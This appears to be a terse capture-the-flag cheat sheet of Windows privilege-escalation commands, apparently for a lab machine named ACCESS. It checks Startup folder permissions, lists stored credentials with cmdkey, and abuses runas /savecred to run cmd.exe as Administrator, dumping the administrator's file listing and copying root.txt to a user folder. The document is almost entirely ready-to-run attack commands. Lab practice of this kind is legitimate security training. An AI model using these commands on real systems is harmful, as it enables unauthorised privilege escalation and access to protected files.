#check permissions  
`icacls C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

#show stored creds  
`cmdkey /list`
  
#runas admin  
`runas /savecred /user:Administrator "cmd.exe"`
`runas /savecred /user:Administrator "cmd.exe /c dir /b /a /s c:\users\administrator > c:\users\hacker\desktop\files.txt" `

`c:\windows\system32\runas.exe /user:ACCESS\Administrator /savecred "c:\windows\system32\cmd.exe /c TYPE c:\users\administrator\desktop\root.txt > c:\users\security\root.txt"`
